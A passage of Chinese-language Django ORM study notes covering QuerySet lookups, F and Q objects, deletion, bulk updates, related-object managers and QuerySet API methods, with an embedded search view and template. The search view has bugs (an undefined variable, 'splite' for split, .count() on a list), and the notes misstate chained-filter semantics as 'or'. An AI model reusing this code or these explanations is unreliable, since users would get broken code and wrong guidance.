这三个QuerySets是独立的。第一个是基础QuerySet,包含了所有标题以"What"开头的条目。第二个是第一个的子集,带有额外条件,排除了pub_date是今天和今天之后的所有记录。第三个是第一个的子集,带有额外条件,只筛选pub_date是今天或未来的所有记录。最初的QuerySet(q1)不受筛选操作影响。

【 检索单一对象get() 】
如果确定检索只会获得一个对象,则可使用Manager的get()方法直接返回这个对象,在get方法中可以使用任何filter方法中的查询参数,用法也一样
>>> one_entry = Entry.objects.get(pk=1)

使用get()和使用filter()然后通过[0]的方式分片不同,看似都是获取单一对象。但如果在查询时没有匹配到对象,get()方法将抛出DoesNotExist异常,这个异常是模型类的一个属性;在使用get()方法查询时如果结果超过1个,则会抛出MultipleObjectsReturned异常,这个异常也是模型类的一个属性。

【 排序 】
>>> Entry.objects.order_by('headline')   # 按headline字段排序
>>> Entry.objects.order_by('-headline')  # 按headline字段反向排序

【 字段查询 】
字段查询其实就是filter()、exclude()和get()等方法的关键字参数,其基本格式是:field__lookuptype=value
字段查询即如何制定SQL WHERE子句,它们以关键字参数的形式传递给QuerySet方法filter()、exclude()和get()
>>> Entry.objects.filter(pub_date__lte='2006-01-01') # SELECT * FROM blog_entry WHERE pub_date <= '2006-01-01';

查询子句中指定的字段必须是模型的一个字段名,例外:在ForeignKey中可以为其添加一个"_id"后缀,这种情况下value参数需要包含foreign模型的主键的原始值
>>> Entry.objects.filter(blog_id=4)
若传入了无效的关键字参数,查询函数会抛出TypeError

数据库API支持20多种查询类型
1、exact
>>> Entry.objects.get(headline__exact="Cat bites dog") # WHERE headline = 'Cat bites dog'
>>> # 下面两条语句是等价的:
>>> Blog.objects.get(id__exact=14)  # Explicit form
>>> Blog.objects.get(id=14)         # __exact is implied

2、iexact:不分大小写的匹配
>>> Blog.objects.get(name__iexact="beatles blog")

3、contains:表示包含的意思,大小写敏感
>>> Entry.objects.get(headline__contains='Lennon') # WHERE headline LIKE '%Lennon%';

icontains: contains大小写不敏感的版本

4、startswith, endswith
以……开头和以……结尾的查找。当然也有大小写不敏感的版本,名为istartswith和iendswith

【 跨关系查询 】
Django提供了强大并且直观的方式解决跨越关联的查询,它在后台自动执行包含JOIN的SQL语句。要跨越某个关联,只需使用关联的模型字段名称,并使用双下划线分隔,直至想要的字段,可以链式跨越,无限跨度
>>> Entry.objects.filter(blog__name='Beatles Blog') # 返回所有Blog的name为'Beatles Blog'的Entry对象

反之亦然,如果要引用一个反向关联,只需要使用模型的小写名
>>> Blog.objects.filter(entry__headline__contains='Lennon') # 获取所有的Blog对象,前提是它所关联的Entry的headline包含'Lennon'

如果在多级关联中进行过滤且其中某个中间模型没有满足过滤条件的值,Django将把它当做一个空的(所有的值都为NULL)但合法的对象,不会抛出任何异常或错误
>>> Blog.objects.filter(entry__authors__name='Lennon')
如果Entry中没有关联任何的author,那么它将当作其没有name,而不会因为没有author引发一个错误。通常这是比较符合逻辑的处理方式。唯一可能困惑的是当使用isnull的时候
>>> Blog.objects.filter(entry__authors__name__isnull=True)
将会返回Blog对象,包含author的name为空的对象,以及那些entry的author为空的对象。若不想要后面的对象可以这样写:
>>> Blog.objects.filter(entry__authors__isnull=False, entry__authors__name__isnull=True)

跨越多值的关系查询
最基本的filter和exclude的关键字参数只有一个,但当关键字参数有多个且是跨越外键或多对多的情况下就比较复杂

Blog.objects.filter(entry__headline__contains='Lennon', entry__pub_date__year=2008)
这是一个跨外键、两个过滤参数的查询,此时理解两个参数之间属于与"and"的关系,也就是说过滤出来的BLog对象对应的entry对象必须同时满足上面两个条件

Blog.objects.filter(entry__headline__contains='Lennon').filter(entry__pub_date__year=2008)
把两个参数拆开放在两个filter调用里面,按照链式过滤,这个结果应该和上面的例子一样,可实际上不一样,Django在这种情况下将两个filter之间的关系设计为或"or"

多对多关系下的多值查询和外键foreignkey的情况一样

但exclude的策略设计的又和filter不一样

Blog.objects.exclude(entry__headline__contains='Lennon', entry__pub_date__year=2008,)
这会排除headline中包含"Lennon"的Entry和在2008年发布的Entry,中间是一个和"or"的关系

要排除同时满足上面两个条件的对象则需要做两次查询:
Blog.objects.exclude(
    entry = Entry.objects.filter(headline__contains='Lennon', pub_date__year=2008)
)

所以建议在碰到跨关系的多值查询时尽量使用Q查询

【 使用F表达式引用模型的字段 】
过滤器可以为模型指定字段
之前都是将模型字段与常量进行比较,但如果想将模型的一个字段与同一个模型的另外一个字段进行比较则需要使用Django提供的F表达式
F()的实例充当查询字段的引用,这些引用可在查询过滤器中用于在同一模型实例中比较两个不同的字段。

查找comments数目多于pingbacks数目的Entry,可以构造一个F()对象来引用pingback数目,并在查询中使用该F()对象:
>>> from django.db.models import F
>>> Entry.objects.filter(n_comments__gt=F('n_pingbacks'))

Django支持对F()对象进行加、减、乘、除、求余以及幂运算等算术操作,两个操作数可以是常数和其它F()对象
查找comments数目比pingbacks两倍还要多的Entry:
>>> Entry.objects.filter(n_comments__gt=F('n_pingbacks') * 2)
查询rating比pingback和comment数目总和要小的Entry:
>>> Entry.objects.filter(rating__lt=F('n_comments') + F('n_pingbacks'))

还可以在F()中使用双下划线来进行跨表查询
查询author的名字与blog名字相同的Entry
>>> Entry.objects.filter(authors__name=F('blog__name'))

对于date和date/time字段,可以加上或减去一个timedelta对象
返回发布时间超过3天后被修改的所有Entry:
>>> from datetime import timedelta
>>> Entry.objects.filter(mod_date__gt=F('pub_date') + timedelta(days=3))

F()对象还支持.bitand()、.bitor()、.bitrightshift()和.bitleftshift()4种位操作
>>> F('somefield').bitand(16)

主键的快捷查询方式:pk
出于方便的目的,Django提供了一种pk查询快捷方式,pk表示主键"primary key",通常一个模型的主键为"id",所以下面3个语句是等效的:
>>> Blog.objects.get(id__exact=14) # Explicit form
>>> Blog.objects.get(id=14) # __exact is implied
>>> Blog.objects.get(pk=14) # pk implies id__exact

pk可以联合其他类型的参数
>>> Blog.objects.filter(pk__in=[1,4,7]) # Get blogs entries with id 1, 4 and 7
>>> Blog.objects.filter(pk__gt=14) # Get all blog entries with id > 14

pk可以跨表操作
>>> Entry.objects.filter(blog__id__exact=3) # Explicit form
>>> Entry.objects.filter(blog__id=3)        # __exact is implied
>>> Entry.objects.filter(blog__pk=3)        # __pk implies __id__exact

在LIKE语句中转义百分号和下划线
等效于LIKE SQL语句的字段查询子句(iexact,contains,icontains,startswith,istartswith,endswith和iendswith)会将LIKE语句中有特殊用途的两个符号即百分号和下划线自动转义。在LIKE语句中百分号匹配多个任意字符,而下划线匹配一个任意字符。
Django自动转义了百分符号和下划线,可以和普通字符一样使用它们
>>> Entry.objects.filter(headline__contains='%') # SELECT ... WHERE headline LIKE '%\%%'

【 使用Q对象进行复杂查询 】
普通filter()中查询使用的关键字参数是通过"AND"连接起来的。如果要执行更复杂的查询如由OR语句连接的查询则可以使用Q对象查询
一个Q对象来自django.db.models.Q,用于封装关键字参数的集合,可以作为关键字参数用于filter、exclude和get等函数

from django.db.models import Q
Q(question__startswith='What')  # 该Q对象压缩了一个LIKE查询

可以使用"&"或"|"或"~"来组合Q对象,分别表示与或非逻辑,它将返回一个新的Q对象
Q(question__startswith='Who') | Q(question__startswith='What') # WHERE question LIKE 'Who%' OR question LIKE 'What%'
Q(question__startswith='Who') | ~Q(pub_date__year=2005)

默认以逗号分隔的都表示AND关系
Poll.objects.get(Q(question__startswith='Who'), Q(pub_date=date(2005, 5, 2)) | Q(pub_date=date(2005, 5, 6)))
# SELECT * from polls WHERE question LIKE 'Who%' AND (pub_date = '2005-05-02' OR pub_date = '2005-05-06')

当关键字参数和Q对象组合使用时,Q对象必须放在前面,如果关键字参数放在Q对象的前面则会报错
Poll.objects.get(Q(pub_date=date(2005, 5, 2)) | Q(pub_date=date(2005, 5, 6)), question__startswith='Who')

</pre>站内分词搜索标题<textarea>
def search(request):
    search_words = request.GET.get('keyword', '').strip()
    condition = None
    for word in search_word.splite(' '):
        if condition is None:
            condition = Q(title__contains = word)
        else:
            condition = condition | Q(title__contains = word)

    search_blogs = []
    if condition is not None:
        search_blogs = Blog.objects.filter(condition)

    paginator = Paginator(search_blogs, 20)
    page_num = request.GET.get('page', 1)
    page_of_blogs = paginator.get_page(page_num)

    context = {}
    context['search_words'] = search_words
    context['search_blogs_count'] = search_blogs.count()
    context['page_of_blogs'] = page_of_blogs
    return render(request, 'search.html', context)

# search.html
<div class="container">
    <div class="row">
        <div class="col-md-8 col-md-offset-2">
            {% if search_words == '' %}
                <h3>你没有搜索任何内容。</h3>
                <p>你可以尝试输入点什么东西,例如：Django</p>
            {% else %}
                <h3>搜索"{{ search_words }}",找到{{ search_blogs_count }}个结果</h3>
                <hr>
                {% for blog in page_of_blogs %}
                    <a href="{% url 'blog_detail' blog.pk %}">
                        <h4>{{ blog.title }}</h4>
                    </a>
                    <p>{{ blog.content | striptags | truncatechars_html:100}}</p>
                {% empty %}
                    <p>没有找到任何东西,换个关键词试试吧</p>
                {% endfor %}
            {% endif %}
        </div>
    </div>
    <div class="row" style="display: flex; justify-content: center;">
        {% if page_of_blogs.has_previous %}
            <a class="btn btn-default" href="{% url 'search' %}?wd={{ search_words }}&page={{ page_of_blogs.previous_page_number }}"> 上一页 </a>
        {% endif %}

        {% if page_of_blogs.has_next %}
        <a class="btn btn-default" href="{% url 'search' %}?wd={{ search_words }}&page={{ page_of_blogs.next_page_number }}"> 下一页 </a>
        {% endif %}
    </div>
</div>

</textarea><pre>
【 比较对象 】
要比较两个模型实例,只需使用标准的Python比较操作符==,实际上在后台这比较了两个模型实例的主键值。
以下的两个语句是等效的:
>>> some_entry == other_entry
>>> some_entry.id == other_entry.id

如果模型的主键不叫做"id"也没关系,后台总是会使用正确的主键名字进行比较,例如如果一个模型的主键的名字是"name",那么下面是相等的:
>>> some_obj == other_obj
>>> some_obj.name == other_obj.name

【 删除对象 】
删除对象使用的是对象的delete()方法,该方法将返回被删除对象的总数量和一个包含了每种被删除对象的类型和该类型的数量的字典
>>> e.delete()  # (1, {'weblog.Entry': 1})
也能批量删除对象,所有QuerySet都有个delete()方法,它会删除QuerySet中的所有成员。
>>> Entry.objects.filter(pub_date__year=2005).delete() # (5, {'webapp.Entry': 5})

有可能不是每一个对象的delete方法都被执行。如果改写了delete方法,为了确保对象被删除,必须手动迭代QuerySet进行逐一删除操作。

当Django删除一个对象时,它默认使用SQL的ON DELETE CASCADE约束,也就是说任何有外键指向要删除对象的对象将一起被删除,这种级联的行为可以通过的ForeignKey的on_delete参数自定义
b = Blog.objects.get(pk=1)
b.delete()  # 删除该条Blog和所有的它关联的Entry对象

delete()是唯一没有在管理器上暴露出来的方法。这是刻意设计的一个安全机制,用来防止意外地请求类似Entry.objects.delete()的动作,而不慎删除了所有的条目。如果确实想删除所有的对象则必须明确地请求一个完全的查询集
Entry.objects.all().delete()

【 复制模型实例 】
虽然没有用于拷贝模型实例的内置方法,但仍能很简单的拷贝所有字段值创建新实例。最简单的例子只需将pk设为None,这会创建一个新的实例copy

blog = Blog(name='My blog', tagline='Blogging is easy')
blog.save()  # blog.pk == 1
blog.pk = None
blog.save()  # blog.pk == 2

但是在使用继承的时候会变得复杂
class ThemeBlog(Blog):
    theme = models.CharField(max_length=200)
django_blog = ThemeBlog(name='Django', tagline='Django is easy', theme='python')
django_blog.save() # django_blog.pk == 3
# 基于继承的工作机制则必须同时将pk和id设为None
django_blog.pk = None
django_blog.id = None
django_blog.save()  # django_blog.pk == 4

对于外键和多对多关系更需要进一步处理。例如Entry有一个ManyToManyField到Author。 复制条目后必须为新条目设置多对多关系
entry = Entry.objects.all()[0]   # some previous entry
old_authors = entry.authors.all()
entry.pk = None
entry.save()
entry.authors.set(old_authors)

对于OneToOneField,还要复制相关对象并将其分配给新对象的字段,以避免违反一对一唯一约束。 例如假设entry已经如上所述重复:
detail = EntryDetail.objects.all()[0]
detail.pk = None
detail.entry = entry
detail.save()

【 批量更新对象 】
使用update()方法可以批量为QuerySet中所有的对象进行更新操作
Entry.objects.filter(pub_date__year=2007).update(headline='Everything is the same')

只可以对普通字段和ForeignKey字段使用这个方法。若要更新一个普通字段,只需提供一个新的常数值。若要更新ForeignKey字段,需设置新值为想指向的新模型实例
>>> b = Blog.objects.get(pk=1)
>>> Entry.objects.all().update(blog=b)  # 修改所有的Entry,让他们都属于b

update方法会被立刻执行,并返回操作匹配到的行的数目,有可能不等于要更新的行的数量,因为有些行可能已经有这个新值了。唯一的约束是只能访问一张数据库表。可以根据关系字段进行过滤,但只能更新模型主表的字段
>>> b = Blog.objects.get(pk=1)
# Update all the headlines belonging to this Blog.
>>> Entry.objects.select_related().filter(blog=b).update(headline='Everything is the same')

update()方法会直接转换成一个SQL语句,并立刻批量执行。它不会运行模型的save()方法,或产生pre_save或post_save信号(调用save()方法产生)或服从auto_now字段选项。如果想保存QuerySet中的每个条目并确保每个实例的save()方法都被调用,则不需要使用任何特殊的函数来处理。只需要迭代它们并调用save()方法
for item in my_queryset: item.save()

update方法可以配合F表达式。这对于批量更新同一模型中某个字段特别有用。例如增加Blog中每个Entry的pingback个数:
>>> Entry.objects.all().update(n_pingbacks=F('n_pingbacks') + 1)

与filter和exclude子句中的F()对象不同,在update中不可以使用F()对象进行跨表操作,只可以引用正在更新的模型的字段。如果尝试使用F()对象引入另外一张表的字段将抛出FieldError异常
>>> Entry.objects.update(headline=F('blog__name'))  # raise a FieldError

</pre>

<h4>关联对象查询</h4><pre>
当在模型中定义了关联关系如ForeignKey、OneToOneField或ManyToManyField,该模型的实例将会自动获取一套API,能快捷地访问关联对象。
Django也提供了从关联关系另一边访问的API,从被关联模型到定义关联关系的模型的连接
一个自定义的模型Entry对象e可以通过blog属性e.blog获取关联的Blog对象。反过来Blog对象b可以通过entry_set属性b.entry_set.all()访问与它关联的所有Entry对象

一对多关联(外键)
正向查询
若模型有个ForeignKey,该模型的实例能通过其属性以圆点加属性的形式方便的访问关联对象。
>>> e = Entry.objects.get(id=2)
>>> e.blog  # 返回关联的Blog对象

可以通过foreign-key属性获取和设置值,对外键的修改直到调用save()后才会被存入数据库
>>> e = Entry.objects.get(id=2)
>>> e.blog = some_blog
>>> e.save()

若ForeignKey字段配置了null=True即其允许NULL值,可以指定值为None移除关联
>>> e = Entry.objects.get(id=2)
>>> e.blog = None
>>> e.save() # "UPDATE blog_entry SET blog_id = NULL ...;"

首次通过正向一对多关联访问关联对象时会缓存关联关系,后续在同一对象上通过外键的访问也会被缓存
>>> e = Entry.objects.get(id=2)
>>> print(e.blog)  # 访问数据库,获取实际数据
>>> print(e.blog)  # 不会访问数据库,直接使用缓存的版本

QuerySet的select_related()方法会递归地预填充所有的一对多关系到缓存中
>>> e = Entry.objects.select_related().get(id=2)
>>> print(e.blog)  # 不会访问数据库,直接使用缓存
>>> print(e.blog)  # 不会访问数据库,直接使用缓存

反向查询
如果一个模型有ForeignKey,那么该ForeignKey所指向的外键模型的实例可以通过一个管理器进行反向查询,返回源模型的所有实例。默认这个管理器的名字为FOO_set,其中FOO是源模型的小写名称。该管理器返回的查询集可以用前面提到的方式进行过滤和操作
>>> b = Blog.objects.get(id=1)
>>> b.entry_set.all()  # Returns all Entry objects related to Blog.
>>> b.entry_set.filter(headline__contains='Lennon') # b.entry_set is a Manager that returns QuerySets
>>> b.entry_set.count()

可以在定义ForeignKey时设置related_name参数重写FOO_set名
若修改Entry模型为blog = ForeignKey(Blog, on_delete=models.CASCADE, related_name='entries')
>>> b = Blog.objects.get(id=1)
>>> b.entries.all() # Returns all Entry objects related to Blog.
>>> b.entries.filter(headline__contains='Lennon')
>>> b.entries.count()

使用自定义反向管理器
默认用于反向关联的RelatedManager是该模型默认管理器的子类。如果想为一个查询指定一个不同的管理器则可以使用下面的语法

from django.db import models
class Entry(models.Model):
    #...
    objects = models.Manager()  # Default Manager
    entries = EntryManager()    # Custom Manager

b = Blog.objects.get(id=1)
b.entry_set(manager='entries').all()

若EntryManager在其get_queryset()方法执行了默认过滤行为,该行为会应用到all()调用中。

当然指定的自定义反向管理器也可以调用它的自定义方法:
b.entry_set(manager='entries').is_published()

管理关联对象的其他方法
除了在前面定义的QuerySet方法之外,ForeignKey管理器还有其它方法用于处理关联的对象集合

add(obj1, obj2, ...):添加指定的模型对象到关联的对象集中。
create(**kwargs):创建一个新的对象,将它保存并放在关联的对象集中,返回新创建的对象。
remove(obj1, obj2, ...):从关联的对象集中删除指定的模型对象。
clear():清空关联的对象集。
set(objs):重置关联的对象集。

若要一次性给关联的对象集赋值,使用set()方法,并给它赋值一个可迭代的对象集合或一个主键值的列表
b = Blog.objects.get(id=1)
b.entry_set.set([e1, e2])  # e1和e2可以是完整的Entry实例,也可以是整数的主键值

如果clear()方法可用,那么在将可迭代对象中的成员添加到集合中之前,将从entry_set中删除所有已经存在的对象。如果clear()方法不可用,那么将直接添加可迭代对象中的成员而不会删除所有已存在的对象。

这节中的每个反向操作都将立即在数据库内执行,所有的增加、创建和删除操作也将立刻自动地保存到数据库内

多对多关联
多对多关系的两端都会自动获得访问另一端的API,这些API的工作方式与前面提到的反向一对多关系的用法一样
唯一的区别在于属性的名称:定义ManyToManyField的模型使用该字段的属性名称,而反向模型使用源模型的小写名称加上'_set',和一对多关系一样

e = Entry.objects.get(id=3)
e.authors.all() # Returns all Author objects for this Entry.
e.authors.count()
e.authors.filter(name__contains='John')
a = Author.objects.get(id=5)
a.entry_set.all() # Returns all Entry objects for this Author.

和ForeignKey一样, ManyToManyField能指定related_name。在上面的例子中若Entry中的ManyToManyField已指定了related_name='entries',随后每个Author实例会拥有一个entries属性,而不是entry_set。
在一个模型中,如果存在多个外键或多对多的关系指向同一个外部模型,必须给他们分别加上不同的related_name,用于反向查询

另一个与一对多关联不同的地方是,除了模型实例以外多对多关联中的add()、set()和remove()方法能接收主键值。例如若e和e2是Entry的实例,以下两种set()调用结果一致:
a = Author.objects.get(id=5)
a.entry_set.set([e1, e2])
a.entry_set.set([e1.pk, e2.pk])

一对一关联
一对一非常类似多对一关系,可以简单的通过模型的属性访问关联的模型

class EntryDetail(models.Model):
    entry = models.OneToOneField(Entry, on_delete=models.CASCADE)
    details = models.TextField()

ed = EntryDetail.objects.get(id=2)
ed.entry # Returns the related Entry object.

不同之处在于反向查询的时候,一对一关系中的关联模型同样具有一个管理器对象,但是该管理器表示一个单一的对象而不是对象的集合
e = Entry.objects.get(id=2)
e.entrydetail  # returns the related EntryDetail object

如果没有对象赋值给这个关系,Django将抛出一个DoesNotExist异常。可以给反向关联进行赋值,方法和正向的关联一样
e.entrydetail = ed

反向关联是如何实现的？
一些ORM框架需要在关系的两端都进行定义。Django的开发者认为这违反了DRY (Don't Repeat Yourself)原则,所以在Django中只需要在一端进行定义。
那么这是怎么实现的呢？因为在关联的模型类没有被加载之前,一个模型类根本不知道有哪些类和它关联。
答案在app registry！在Django启动的时候它会导入所有INSTALLED_APPS中的应用和每个应用中的模型模块。每创建一个新的模型时,Django会自动添加反向的关系到所有关联的模型。如果关联的模型还没有导入,Django将保存关联的记录并在关联的模型导入时添加这些关系。
由于这个原因,将模型所在的应用都定义在INSTALLED_APPS的应用列表中就显得特别重要,否则反向关联将不能正确工作。

通过关联对象进行查询
涉及关联对象的查询与正常值的字段查询遵循同样的规则,当指定查询需要匹配的值时可以使用一个对象实例或对象的主键值
如果有一个id=5的Blog对象b,下面的三个查询将是完全一样的
Entry.objects.filter(blog=b)    # Query using object instance
Entry.objects.filter(blog=b.id) # Query using id from instance
Entry.objects.filter(blog=5)    # Query using id directly

使用原生SQL语句
若发现需要编写的SQL查询语句太过复杂,以至于Django的数据库映射无法处理,可以回归手动编写SQL。Django针对编写原生SQL有许多选项

Django的数据库层只是一个数据库接口。可以利用其它的工具、编程语言或数据库框架来访问数据库,Django没有强制指定非要使用它的某个功能或模块

</pre>

<h4>查询集API</h4><pre>
QuerySet何时被提交
在内部创建、过滤、切片和传递一个QuerySet不会真实操作数据库,在对查询集提交之前不会发生任何实际的数据库操作。
可以使用下列方法对QuerySet提交查询操作
1、迭代:QuerySet是可迭代的,在首次迭代查询集时执行实际的数据库查询,for e in Entry.objects.all(): print(e.headline)
2、切片:如果使用切片的"step"参数,Django将执行数据库查询并返回一个列表,Entry.objects.all()[0]、Entry.objects.all()[:2]
3、Pickling/缓存
4、repr()
5、len():当对QuerySet调用len()时将提交数据库操作。
6、list():对QuerySet调用list()将强制提交操作entry_list = list(Entry.objects.all())
7、bool():if Entry.objects.filter(headline="Test"): print("There is at least one Entry with the headline Test")
如果需要知道是否存在至少一条记录,而不需要真实的对象,则使用exists()将更加高效

对于QuerySet的正式定义:
class QuerySet(model=None, query=None, using=None)
QuerySet类具有两个公有属性用于内省:
ordered:如果QuerySet是排好序的则为True,否则为False。
db:如果现在执行,则返回使用的数据库。

</pre>

<h4>返回一个新QuerySets的方法API</h4><pre>
filter()    过滤查询对象。
exclude()   排除满足条件的对象
annotate()  使用聚合函数
order_by()  对查询集进行排序
reverse()   反向排序
distinct()  对查询集去重
values()    返回包含对象具体值的字典的QuerySet
values_list()   与values()类似,只是返回的是元组而不是字典。
dates() 根据日期获取查询集
datetimes() 根据时间获取查询集
none()  创建空的查询集
all()   获取所有的对象
union() 并集
intersection()  交集
difference()    差集
select_related()    附带查询关联对象
prefetch_related()  预先查询
extra() 附加SQL查询
defer() 不加载指定字段
only()  只加载指定的字段
using() 选择数据库
select_for_update() 锁住选择的对象直到事务结束。
raw()   接收一个原始的SQL查询

1. filter()
filter(**kwargs)
返回满足查询参数的对象集合
查找的参数(**kwargs)应该满足字段查找中的格式,多个参数之间是和AND的关系。

2. exclude()
exclude(**kwargs)
返回一个新的QuerySet,它包含不满足给定的查找参数的对象。
查找的参数(**kwargs)应该满足字段查找中的格式。多个参数通过AND连接,然后所有的内容放入NOT()中。

# 排除所有pub_date晚于2005-1-3且headline为"Hello" 的记录:
Entry.objects.exclude(pub_date__gt=datetime.date(2005, 1, 3), headline='Hello')
# 排除所有pub_date晚于2005-1-3或headline 为"Hello" 的记录:
Entry.objects.exclude(pub_date__gt=datetime.date(2005, 1, 3)).exclude(headline='Hello')

3. annotate()
annotate(args, *kwargs)
使用提供的聚合表达式查询对象。
表达式可以是简单的值、对模型或任何关联模型上的字段的引用或聚合表达式即平均值、总和等
annotate()的每个参数都是一个annotation,它将添加到返回的QuerySet每个对象中。
关键字参数指定的Annotation将使用关键字作为Annotation的别名。匿名参数的别名将基于聚合函数的名称和模型的字段生成。 只有引用单个字段的聚合表达式才可以使用匿名参数,其它所有形式都必须用关键字参数。

如果正在操作一个Blog列表,可能想知道每个Blog有多少Entry:
>>> from django.db.models import Count
>>> q = Blog.objects.annotate(Count('entry'))
>>> q[0].name  # The name of the first blog
'Blogasaurus'
>>> q[0].entry__count # The number of entries on the first blog
42

Blog模型本身没有定义entry__count属性,但是通过使用一个关键字参数来指定聚合函数,可以控制Annotation的名称:
>>> q = Blog.objects.annotate(number_of_entries=Count('entry'))
# The number of entries on the first blog, using the name provided
>>> q[0].number_of_entries
42

4. order_by()
order_by(*fields)
默认根据模型的Meta类中的ordering属性对QuerySet中的对象进行排序
Entry.objects.filter(pub_date__year=2005).order_by('-pub_date', 'headline') # 将按照pub_date降序排序,然后再按照headline升序排序。"-pub_date"前面的负号表示降序顺序,升序是默认的
Entry.objects.order_by('?') # 随机排序使用"?",order_by('?')可能耗费资源且很慢,这取决于使用的数据库。

若要按照另外一个模型中的字段排序,可以使用查询关联模型的语法,即通过字段的名称后面跟两个下划线(__),再加上新模型中的字段的名称,直到希望连接的模型
Entry.objects.order_by('blog__name', 'headline')

如果排序的字段与另外一个模型关联,Django将使用关联的模型的默认排序,或者如果没有指定Meta.ordering将通过关联的模型的主键排序。
Entry.objects.order_by('blog')  # Blog模型没有指定默认的排序
与以下相同:
Entry.objects.order_by('blog__id')
如果Blog设置了ordering = ['name'],那么第一个QuerySet将等同于:
Entry.objects.order_by('blog__name')

还可以通过调用表达式的desc()或asc()方法:
Entry.objects.order_by(Coalesce('summary', 'headline').desc())

考虑指定一个多值字段来排序,例如一个ManyToManyField字段或ForeignKey字段的反向关联
class Event(Model):
   parent = models.ForeignKey('self', on_delete=models.CASCADE, related_name='children')
   date = models.DateField()
Event.objects.order_by('children__date')
在这里每个Event可能有多个排序数据;具有多个children的每个Event将被多次返回到order_by()创建的新的QuerySet中。 换句话说,用order_by()方法对QuerySet对象进行操作会返回一个扩大版的新QuerySet对象。因此使用多值字段对结果进行排序时要格外小心。

没有方法指定排序是否考虑大小写。 对于大小写的敏感性,Django将根据数据库中的排序方式排序结果。
可以通过Lower将一个字段转换为小写来排序,它将达到大小写一致的排序:
Entry.objects.order_by(Lower('headline').desc())

可以通过检查QuerySet.ordered属性来知道查询是否是排序的。

每个order_by()都将清除前面的任何排序。 例如下面的查询将按照pub_date排序,而不是headline:
Entry.objects.order_by('headline').order_by('pub_date')

5. reverse()
reverse()
反向排序QuerySet中返回的元素,第二次调用reverse()将恢复到原有的排序。
my_queryset.reverse()[:5]  # 获取QuerySet中最后五个元素,这与Python直接使用负索引不一样,Django不支持负索引

6. distinct()
distinct(*fields)
去除查询结果中重复的行。
默认QuerySet不会去除重复的行。当查询跨越多张表的数据时QuerySet可能得到重复的结果,这时候可以使用distinct()进行去重。

7. values()
values(fields, *expressions)
返回一个包含数据的字典的queryset,而不是模型实例,每个字典表示一个对象,键对应于模型对象的属性名称。

# 列表中包含的是Blog对象
>>> Blog.objects.filter(name__startswith='Beatles')
< QuerySet [< Blog: Beatles Blog>]>
# 列表中包含的是数据字典
>>> Blog.objects.filter(name__startswith='Beatles').values()
< QuerySet [{'id': 1, 'name': 'Beatles Blog', 'tagline': 'All the latest Beatles news.'}]>

该方法接收可选的位置参数*fields,它指定values()应该限制哪些字段。如果指定字段则每个字典将只包含指定的字段的键/值,没有指定字段则每个字典将包含数据库表中所有字段的键和值。

>>> Blog.objects.values()
< QuerySet [{'id': 1, 'name': 'Beatles Blog', 'tagline': 'All the latest Beatles news.'}]>
>>> Blog.objects.values('id', 'name')
< QuerySet [{'id': 1, 'name': 'Beatles Blog'}]>

values()方法还有关键字参数**expressions,这些参数将传递给annotate():
>>> from django.db.models.functions import Lower
>>> Blog.objects.values(lower_name=Lower('name'))
< QuerySet [{'lower_name': 'beatles blog'}]>

在values()子句中的聚合应用于相同values()子句中的其他参数之前,如果需要按另一个值分组,请将其添加到较早的values()子句中
>>> from django.db.models import Count
>>> Blog.objects.values('author', entries=Count('entry'))
< QuerySet [{'author': 1, 'entries': 20}, {'author': 1, 'entries': 13}]>
>>> Blog.objects.values('author').annotate(entries=Count('entry'))
< QuerySet [{'author': 1, 'entries': 33}]>

如果有一个字段foo是一个ForeignKey,默认的foo_id参数返回的字典中将有一个叫做foo的键,因为这是保存实际值的那个隐藏的模型属性的名称。 当调用foo_id并传递字段的名称,传递foo或values()都可以,得到的结果是相同的
>>> Entry.objects.values()
< QuerySet [{'blog_id': 1, 'headline': 'First Entry', ...}, ...]>
>>> Entry.objects.values('blog')
< QuerySet [{'blog': 1}, ...]>
>>> Entry.objects.values('blog_id')
< QuerySet [{'blog_id': 1}, ...]>

当values()与distinct()一起使用时,注意排序可能影响最终的结果。

如果values()子句位于extra()调用之后,extra()中的select参数定义的字段必须显式包含在values()调用中。 values()调用后面的extra()调用将忽略选择的额外的字段。

在values()之后调用only()和defer()不太合理,所以将引发一个NotImplementedError。

可以通过ManyToManyField、ForeignKey和OneToOneFiel属性反向引用关联的模型的字段:
>>> Blog.objects.values('name', 'entry__headline')
< QuerySet [{'name': 'My blog', 'entry__headline': 'An entry'},{'name': 'My blog', 'entry__headline': 'Another entry'}, ...]>

8. values_list()
values_list(*fields, flat=False)
values()和values_list()都用于特定情况下的优化:检索数据子集,而无需创建模型实例。
如果不传递任何值给values_list()将以在模型中定义的顺序返回模型中的所有字段

与values()类似,只是在迭代时返回的是元组而不是字典。每个元组包含传递给values_list()调用的相应字段或表达式的值,因此第一个项目是第一个字段等
>>> Entry.objects.values_list('id', 'headline')
< QuerySet [(1, 'First entry'), ...]>
>>> from django.db.models.functions import Lower
>>> Entry.objects.values_list('id', Lower('headline'))
< QuerySet [(1, 'first entry'), ...]>

如果只传递一个字段,还可以传递flat参数,flat=True表示返回的结果为单个值而不是元组,如果有多个字段传递flat将发生错误
>>> Entry.objects.values_list('id').order_by('id')
< QuerySet[(1,), (2,), (3,), ...]>
>>> Entry.objects.values_list('id', flat=True).order_by('id')
< QuerySet [1, 2, 3, ...]>

常见的情况是获取某个模型实例的特定字段值,可以使用values_list(),然后调用get():
>>> Entry.objects.values_list('headline', flat=True).get(pk=1)
'First entry'

注意通过ManyToManyField进行查询时的行为:
>>> Author.objects.values_list('name', 'entry__headline')
< QuerySet [('Noam Chomsky', 'Impressions of Gaza'),
 ('George Orwell', 'Why Socialists Do Not Believe in Fun'),
 ('George Orwell', 'In Defence of English Cooking'),
 ('Don Quixote', None)]>

类似地,当查询反向外键时对于没有任何作者的条目返回None。
>>> Entry.objects.values_list('authors')
< QuerySet [('Noam Chomsky',), ('George Orwell',), (None,)]>

9. dates()
dates(field, kind, order='ASC')
返回一个QuerySet,表示QuerySet内容中特定类型的所有可用日期的datetime.date对象列表。
field参数是模型的DateField的名称
kind参数应为"year"、"month"或"day",结果列表中的每个datetime.date对象被截取为给定的类型。
"year"返回对应该field的所有不同年份值的列表。
"month"返回字段的所有不同年/月值的列表。
"day"返回字段的所有不同年/月/日值的列表。
order参数默认为'ASC',或'DESC',它指定如何排序结果。

>>> Entry.objects.dates('pub_date', 'year')
[datetime.date(2005, 1, 1)]
>>> Entry.objects.dates('pub_date', 'month')
[datetime.date(2005, 2, 1), datetime.date(2005, 3, 1)]
>>> Entry.objects.dates('pub_date', 'day')
[datetime.date(2005, 2, 20), datetime.date(2005, 3, 20)]
>>> Entry.objects.dates('pub_date', 'day', order='DESC')
